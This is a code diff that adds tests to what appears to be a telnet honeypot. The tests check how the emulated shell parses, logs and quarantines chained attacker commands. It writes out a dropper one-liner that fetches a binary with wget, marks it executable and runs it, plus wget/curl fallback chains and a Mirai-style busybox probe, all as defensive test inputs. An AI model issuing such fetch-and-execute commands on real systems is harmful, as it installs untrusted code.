@@ -223,3 +223,73 @@ def test_queued_mode_times_out_gracefully_if_no_worker_responds(config):
     events = _read_events(config)
     download_events = [e for e in events if e["event"] == "file.download"]
     assert download_events[-1]["outcome"] == "failed"
+
+
+def test_chained_dropper_one_liner_downloads_and_logs_each_step(config):
+    """`cd /tmp || ...; wget ...; chmod +x ...; ./x` is how droppers actually
+    arrive -- a single dispatch() of that line used to miss the wget."""
+    with tempfile.TemporaryDirectory() as d:
+        (Path(d) / "mal.bin").write_bytes(b"payload-bytes")
+        server = _Server(Path(d))
+        try:
+            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+            line = (f"cd /tmp || cd /var/run; wget {server.url('mal.bin')} -O mal.bin; "
+                    "chmod +x mal.bin; ./mal.bin")
+            output = asyncio.run(session.handle_command(line))
+        finally:
+            server.stop()
+
+    assert "saved" in output
+    events = _read_events(config)
+    assert [e["outcome"] for e in events if e["event"] == "file.download"] == ["requested", "success"]
+    assert len([e for e in events if e["event"] == "file.execution_attempt"]) == 2
+    assert len(list(Path(config.fetcher.quarantine_dir).glob("*.bin"))) == 1
+
+
+def test_or_alternative_is_skipped_when_first_download_succeeds(config):
+    with tempfile.TemporaryDirectory() as d:
+        (Path(d) / "mal.bin").write_bytes(b"payload-bytes")
+        server = _Server(Path(d))
+        try:
+            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+            url = server.url("mal.bin")
+            asyncio.run(session.handle_command(f"wget {url} -O a || curl -o a {url}"))
+        finally:
+            server.stop()
+
+    requested = [e for e in _read_events(config)
+                 if e["event"] == "file.download" and e["outcome"] == "requested"]
+    assert len(requested) == 1
+
+
+def test_or_alternative_runs_when_first_download_fails(config):
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+    asyncio.run(session.handle_command(
+        "wget http://nonexistent.invalid/a -O a || wget http://nonexistent.invalid/b -O b"))
+    requested = [e for e in _read_events(config)
+                 if e["event"] == "file.download" and e["outcome"] == "requested"]
+    assert len(requested) == 2
+
+
+def test_and_chain_stops_after_failure(config):
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+    output = asyncio.run(session.handle_command("cd /nonexistent && echo unreachable"))
+    assert "unreachable" not in output
+
+
+def test_mirai_probe_line_gets_applet_not_found_reply(config):
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+    output = asyncio.run(session.handle_command("ls /home; /bin/busybox BOTNET"))
+    assert output.splitlines()[-1] == "BOTNET: applet not found"
+
+
+def test_exit_in_a_chain_stops_later_segments(config):
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+    output = asyncio.run(session.handle_command("exit; echo after"))
+    assert session.should_exit and "after" not in output
